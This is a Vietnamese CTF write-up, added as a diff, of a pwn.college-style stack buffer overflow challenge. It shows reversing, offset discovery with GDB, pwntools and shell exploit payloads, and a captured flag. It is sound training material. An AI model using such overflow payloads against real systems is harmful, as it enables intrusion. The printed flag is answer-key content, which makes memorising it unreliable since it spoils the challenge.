@@ -1,0 +1,173 @@
+## 📌 [Viettel Training Program] - Your First Overflow (hard)
+
+- **Category:** Binary Exploitation (Pwn)
+- **Difficulty:** Hard
+- **Points:** —
+- **Description:** Cùng ý tưởng với bản easy — tràn buffer để ghi đè `win_variable` và gọi `win()` — nhưng **không in offset hay dump stack**. Buffer và layout có thể khác; cần reverse / debug để tìm offset. Binary: `binary-exploitation-first-overflow` (source được cung cấp trên nền tảng challenge, không có trong repo local).
+
+## 1. Khảo sát Ban đầu (Mitigation Check)
+
+> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.
+
+```bash
+$ checksec ./binary-exploitation-first-overflow
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+```
+
+**Nhận xét nhanh:**
+
+- **Stack Canary bật** → Không được ghi đè vượt qua canary (offset ~88 từ đầu buffer) nếu hàm `challenge()` trả về bình thường sau `win()`.
+- **NX enabled** → Không cần shellcode; bài chỉ ghi đè biến cục bộ.
+- **PIE disabled** → Địa chỉ code cố định (hữu ích ở bài sau, không cần cho exploit này).
+- **Không có output debug** (khác easy) → Offset phải tự tìm bằng disassembly hoặc GDB/pwndbg.
+
+**So với bản easy:**
+
+| | Easy | Hard |
+|---|------|------|
+| Binary | `binary-exploitation-first-overflow-w` | `binary-exploitation-first-overflow` |
+| In offset / dump stack | Có | **Không** |
+| `input[]` | 122 byte | **80 byte** |
+| Offset → `win_variable` | 124 | **80** |
+| Stack canary | Tắt (chỉ hiển thị) | **Bật** |
+
+## 2. Phân tích Tĩnh & Động (Reversing & Analysis)
+
+### Phân tích tĩnh (objdump / Ghidra)
+
+Hàm `challenge()` (địa chỉ `0x4020e1`) có logic tương tự easy nhưng gọn hơn:
+
+```c
+struct {
+    char input[80];      // rbp-0x60, 10 QWORD được zero
+    int win_variable;    // rbp-0x10
+} data = {0};
+
+unsigned long size = 4096;   // thực tế read 0x1000 byte
+read(0, &data.input, size);
+
+if (data.win_variable)
+    win();
+puts("Goodbye!");
+// kiểm tra stack canary tại rbp-0x8
+```
+
+**Lỗi:** `read()` cho phép ghi tới **4096 byte** vào buffer chỉ **80 byte** → tràn stack, ghi đè `win_variable` và (nếu dài hơn) vùng canary / saved frame.
+
+Hàm `win()` mở `/flag` và in nội dung (giống easy).
+
+> Bản hard **không** gọi `DUMP_STACK()` và **không** in dòng *"The win variable is stored at … N bytes after …"*.
+
+### Tính offset từ disassembly
+
+| Thành phần | Vị trí stack | Offset từ `input` |
+|------------|--------------|-------------------|
+| `input[80]` | `rbp-0x60` … `rbp-0x11` | 0 – 79 |
+| `win_variable` | `rbp-0x10` | **80 – 83** |
+| Stack canary | `rbp-0x8` | 88 – 95 (tránh ghi đè) |
+
+Khoảng cách: `0x60 - 0x10 = 0x50` → **80 byte** padding trước khi ghi 4 byte vào `win_variable`.
+
+### Phân tích động (GDB / pwndbg)
+
+Chạy binary, gửi pattern và quan sát sau `read`:
+
+```text
+$ gdb ./binary-exploitation-first-overflow
+pwndbg> break *challenge+0x86    # sau lệnh read (0x402167)
+pwndbg> run
+Send your payload (up to 4096 bytes)!
+pwndbg> cyclic 100
+pwndbg> continue
+pwndbg> x/wx $rbp-0x10          # win_variable
+0x7fffffffe4a0: 0x61616161
+
+pwndbg> cyclic -l 0x61616161
+[*] Found offset of 80
+```
+
+Hoặc một lần chạy với payload thử:
+
+```bash
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*80 + b"\x01\x00\x00\x00")' | ./binary-exploitation-first-overflow
+```
+
+Nếu offset đúng, thấy `You win! Here is your flag:` (khi chạy trên môi trường có `/flag` và quyền phù hợp).
+
+=> **Offset tới `win_variable` = 80 bytes**.
+
+## 3. Ý tưởng Tấn công (Exploit Strategy)
+
+Vẫn là **variable overwrite**, không cần ROP / ret2libc:
+
+1. Gửi **80 byte** padding (ví dụ `'A'`) để lấp `input[]`.
+2. Ghi **4 byte** little-endian khác 0 vào `win_variable` (ví dụ `p32(1)`).
+3. `if (data.win_variable)` → `win()` → đọc và in flag.
+
+> Payload tối thiểu **84 byte**. Tránh ghi thêm byte lên vùng canary (`rbp-0x8`) nếu không muốn crash khi hàm return sau khi `win()` thành công.
+
+> Không copy offset **124** từ bản easy — buffer hard chỉ **80** byte.
+
+## 4. Mã Khai thác (Exploit Script)
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "info"
+
+# exe = ELF("./binary-exploitation-first-overflow")
+# r = process("./binary-exploitation-first-overflow")
+r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote
+
+OFFSET = 80  # hard: input[80], không phải 124 như easy
+
+payload = flat({
+    OFFSET: p32(1),  # win_variable != 0
+})
+
+r.sendafter(b"Send your payload", payload)
+
+r.interactive()
+```
+
+Payload tối thiểu:
+
+```python
+from pwn import *
+r = process("./binary-exploitation-first-overflow")
+r.sendafter(b"Send your payload", b"A" * 80 + p32(1))
+r.interactive()
+```
+
+Hoặc không dùng pwntools (local):
+
+```bash
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*80 + b"\x01\x00\x00\x00")' | ./binary-exploitation-first-overflow
+```
+
+## 5. Kết quả & Flag
+
+Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):
+
+```text
+Send your payload (up to 4096 bytes)!
+You win! Here is your flag:
+pwn.college{MucpgCgUxR_hyHpiEkgKHeWn_9h.dBTOywSMzgjNwEzW}
+
+Goodbye!
+```
+
+*(Local không có `/flag` có thể chỉ thấy thông báo lỗi mở file sau `You win!` — vẫn chứng minh `win()` đã được gọi.)*
+
+**Lessons Learned (Bài học rút ra):**
+
+- Bản **hard** không cho offset sẵn: phải dùng **disassembly** (`lea` buffer / `cmp` với `win_variable`) hoặc **GDB + cyclic**.
+- Cùng một bài có thể đổi **kích thước buffer** (122 → 80) → offset thay đổi hoàn toàn.
+- **Stack canary** có mặt nhưng exploit “chỉ đủ dài” tới `win_variable` vẫn khả thi; ghi thêm byte có thể làm hỏng canary khi thoát hàm.
+- Luôn đối chiếu mitigations (`checksec`) giữa easy và hard trước khi tái sử dụng payload cũ.
